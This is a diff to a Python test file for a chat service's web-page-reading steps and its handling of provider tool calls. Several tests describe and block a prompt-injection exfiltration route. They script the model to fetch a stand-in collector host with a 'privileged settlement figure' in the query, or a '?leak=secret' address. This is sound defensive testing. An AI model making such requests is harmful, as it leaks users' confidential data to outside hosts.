@@ -94,6 +94,11 @@ def _send(**body: object) -> list[object]:
     return events
 
 
+def _asking(text: str) -> dict[str, object]:
+    """The request body for a message in the user's own words."""
+    return {"messages": [{"role": "user", "content": text}]}
+
+
 def _text(events: list[object]) -> str:
     return "".join(event["delta"] for event in events if isinstance(event, dict) and "delta" in event)
 
@@ -418,10 +423,121 @@ def test_a_page_that_cannot_be_read_tells_the_model_why(
     monkeypatch.setattr(chat_route, "fetch_web_source", fetch)
     model = scripted(_steps({"do": "read_page", "url": "https://example.com/gone"}), "The page is gone.")
 
-    events = _send(web_enabled=True)
+    events = _send(web_enabled=True, **_asking("What does https://example.com/gone say?"))
 
     assert _step_facts(events)[0]["ok"] is False
     assert "Web source fetch failed for example.com: HTTP 404." in str(model.calls[1][-1]["content"])
+
+
+def test_an_address_the_reply_was_never_given_is_not_fetched(
+    scripted, web_search: list[str], monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Text the model read can tell it to fetch an address that carries what it
+    knows away. A step reads only an address the turn already holds."""
+    monkeypatch.setattr(
+        chat_route, "fetch_web_source", lambda *_args, **_kwargs: pytest.fail("no page may be fetched")
+    )
+    model = scripted(
+        _steps({"do": "read_page", "url": "https://collector.example/c?q=privileged+settlement+figure"}),
+        "I could not read it.",
+    )
+
+    events = _send(web_enabled=True)
+
+    assert _step_facts(events)[0]["ok"] is False
+    assert "not one this reply was given" in str(model.calls[1][-1]["content"])
+    assert _step_audits()[0]["steps"] == [{"do": "read_page", "ok": False, "found": 0, "host": "collector.example"}]
+    assert "privileged" not in json.dumps(_step_audits())
+
+
+def test_a_search_result_with_something_added_to_its_address_is_a_different_address(
+    scripted, web_search: list[str], monkeypatch: pytest.MonkeyPatch
+) -> None:
+    monkeypatch.setattr(
+        chat_route, "fetch_web_source", lambda *_args, **_kwargs: pytest.fail("no page may be fetched")
+    )
+    scripted(_steps({"do": "read_page", "url": "https://example.com/1?leak=secret"}), "Not read.")
+
+    events = _send(web_enabled=True)
+
+    assert _step_facts(events)[0]["ok"] is False
+
+
+def test_another_page_on_a_search_results_host_is_a_different_address(
+    scripted, web_search: list[str], monkeypatch: pytest.MonkeyPatch
+) -> None:
+    monkeypatch.setattr(
+        chat_route, "fetch_web_source", lambda *_args, **_kwargs: pytest.fail("no page may be fetched")
+    )
+    scripted(_steps({"do": "read_page", "url": "https://example.com/private"}), "Not read.")
+
+    events = _send(web_enabled=True)
+
+    assert _step_facts(events)[0]["ok"] is False
+
+
+def test_an_address_that_is_not_a_web_page_is_never_read_even_from_a_search_result(
+    scripted, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    class FtpResult:
+        title = "Archive"
+        url = "ftp://example.com/archive"
+        snippet = "An archive."
+
+    class Search:
+        engine = "duckduckgo"
+        api_key = None
+
+        def search(self, _query: str) -> list[FtpResult]:
+            return [FtpResult()]
+
+    monkeypatch.setattr(chat_route, "web_search_client_from_config", lambda _settings: Search())
+    monkeypatch.setattr(
+        chat_route, "fetch_web_source", lambda *_args, **_kwargs: pytest.fail("no page may be fetched")
+    )
+    model = scripted(_steps({"do": "read_page", "url": "ftp://example.com/archive"}), "Not read.")
+
+    events = _send(web_enabled=True)
+
+    assert _step_facts(events)[0]["ok"] is False
+    assert "not one this reply was given" in json.dumps(model.calls[1])
+
+
+@pytest.mark.parametrize(
+    ("typed", "asked_for"),
+    [
+        ("Summarise https://example.com/terms.", "https://example.com/terms"),
+        ("See (https://Example.com/terms) please", "https://example.com/terms#section-2"),
+        ("https://example.com", "https://example.com/"),
+    ],
+)
+def test_a_page_the_user_linked_can_be_read_however_the_address_is_punctuated(
+    scripted, web_search: list[str], monkeypatch: pytest.MonkeyPatch, typed: str, asked_for: str
+) -> None:
+    fetched: list[str] = []
+
+    def fetch(url: str, **_kwargs: object) -> FetchedWebSource:
+        fetched.append(url)
+        return _page(url, "The terms.")
+
+    monkeypatch.setattr(chat_route, "fetch_web_source", fetch)
+    scripted(_steps({"do": "read_page", "url": asked_for}), "Read.")
+
+    events = _send(web_enabled=True, **_asking(typed))
+
+    assert fetched == [asked_for]
+    assert _step_facts(events)[0]["ok"] is True
+
+
+def test_the_audit_trail_names_the_host_of_every_page_a_step_asked_for(
+    scripted, web_search: list[str], monkeypatch: pytest.MonkeyPatch
+) -> None:
+    monkeypatch.setattr(chat_route, "fetch_web_source", lambda url, **_kwargs: _page(url, "Page text."))
+    scripted(_steps({"do": "read_page", "url": "https://example.com/1"}), "Read [U1].")
+
+    _send(web_enabled=True)
+
+    assert _step_audits()[0]["steps"] == [{"do": "read_page", "ok": True, "found": 1, "host": "example.com"}]
 
 
 def test_pages_are_read_only_when_the_user_turned_web_on(scripted, monkeypatch: pytest.MonkeyPatch) -> None:
@@ -549,7 +665,12 @@ def test_with_citations_off_steps_add_no_source_rows(scripted, staged_knowledge,
         "Capped [K2], per the web [W3] and the page [U1].",
     )
 
-    events = _send(knowledge_config_ids=[_BASE], web_enabled=True, citations_enabled=False)
+    events = _send(
+        knowledge_config_ids=[_BASE],
+        web_enabled=True,
+        citations_enabled=False,
+        **_asking("Compare the cap with https://example.com/9"),
+    )
 
     assert _done(events)["citations"] == []
 
@@ -567,7 +688,11 @@ def test_a_page_read_twice_keeps_one_number_and_another_page_takes_the_next(
         "From the second page [U2].",
     )
 
-    events = _send(web_enabled=True, citations_enabled=True)
+    events = _send(
+        web_enabled=True,
+        citations_enabled=True,
+        **_asking("Read https://example.com/a and https://example.com/b."),
+    )
 
     assert [line.split(" ")[1] for line in _result_lines(model)] == ["[U1]", "[U1]", "[U2]"]
     cited = [c for c in _done(events)["citations"] if c.get("cited")]
@@ -687,8 +812,80 @@ def test_a_page_whose_address_cannot_be_kept_is_read_but_never_listed_as_a_sourc
     monkeypatch.setattr(chat_route, "fetch_web_source", fetch)
     model = scripted(_steps({"do": "read_page", "url": "https://example.com/redirects"}), "As read [U1].")
 
-    events = _send(web_enabled=True, citations_enabled=True)
+    events = _send(web_enabled=True, citations_enabled=True, **_asking("Read https://example.com/redirects"))
 
     assert _result_lines(model) == ["- [U1] Rates page: Readable text."]
     assert [c for c in _done(events)["citations"] if not c["source_uri"]] == []
     assert [c for c in _done(events)["citations"] if c.get("u_index")] == []
+
+
+def test_steps_a_model_asks_for_in_its_own_tool_call_markup_are_taken_and_never_shown(scripted) -> None:
+    """Kimi on Azure AI Foundry sometimes writes the step block as a native
+    tool call. The provider leaves it in the reply text because the request
+    declared no tools."""
+    native_call = (
+        '<|open|>tools<|sep|><|open|>call tool="aperture-steps" index="1"<|sep|>'
+        '<|open|>argument key="steps" type="array"<|sep|>[{"do":"calculate","expression":"2 + 2"}]'
+        "<|close|>argument<|sep|><|close|>call<|sep|><|close|>tools<|sep|><|close|>message<|sep|>"
+    )
+    model = scripted(native_call, "The total is 4.")
+
+    events = _send()
+
+    assert _text(events) == "The total is 4."
+    assert [fact["about"] for fact in _step_facts(events)] == ["2 + 2"]
+    assert all(fact["ok"] for fact in _step_facts(events))
+    assert len(model.calls) == 2
+
+
+def test_steps_a_model_asks_for_as_a_real_tool_call_are_taken(monkeypatch: pytest.MonkeyPatch) -> None:
+    """Mistral on Azure AI Foundry answers with a tool call and no text even
+    though the request declared no tools. The reply used to come back empty."""
+    calls: list[list[dict[str, object]]] = []
+
+    def stream(_client: object, **kwargs: object) -> Iterator[str]:
+        calls.append(list(kwargs["messages"]))  # type: ignore[arg-type]
+        sink = kwargs["usage_sink"]
+        if len(calls) == 1:
+            sink["finish_reason"] = "tool_calls"  # type: ignore[index]
+            sink["tool_calls"] = [  # type: ignore[index]
+                {"name": "aperture-steps", "arguments": json.dumps({"steps": [{"do": "calculate", "expression": "2 + 2"}]})}
+            ]
+            return iter([])
+        sink["finish_reason"] = "stop"  # type: ignore[index]
+        return iter(["The total ", "is 4."])
+
+    monkeypatch.setattr(chat_route, "_resolve_gateway_route", _route)
+    monkeypatch.setattr(chat_route, "_gateway_stream", stream)
+
+    events = _send()
+
+    assert _text(events) == "The total is 4."
+    assert [fact["about"] for fact in _step_facts(events)] == ["2 + 2"]
+    assert len(calls) == 2
+    assert "2 + 2 = 4" in str(calls[1][-1]["content"])
+
+
+def test_tool_calls_on_a_turn_that_declared_tools_are_not_read_as_steps(monkeypatch: pytest.MonkeyPatch) -> None:
+    """A caller's own tools, and the web search tool the gateway declares for
+    OpenRouter, answer with tool calls that are not requests to Aperture."""
+    calls: list[list[dict[str, object]]] = []
+
+    def stream(_client: object, **kwargs: object) -> Iterator[str]:
+        calls.append(list(kwargs["messages"]))  # type: ignore[arg-type]
+        sink = kwargs["usage_sink"]
+        sink["finish_reason"] = "stop"  # type: ignore[index]
+        sink["tool_calls"] = [{"name": "calculate", "arguments": json.dumps({"expression": "2 + 2"})}]  # type: ignore[index]
+        return iter(["The total is 4."])
+
+    monkeypatch.setattr(chat_route, "_resolve_gateway_route", _route)
+    monkeypatch.setattr(chat_route, "_gateway_stream", stream)
+    monkeypatch.setattr(
+        chat_route, "_gateway_web_search_tools", lambda *_args: [{"type": "openrouter:web_search"}]
+    )
+
+    events = _send()
+
+    assert _text(events) == "The total is 4."
+    assert _step_facts(events) == []
+    assert len(calls) == 1
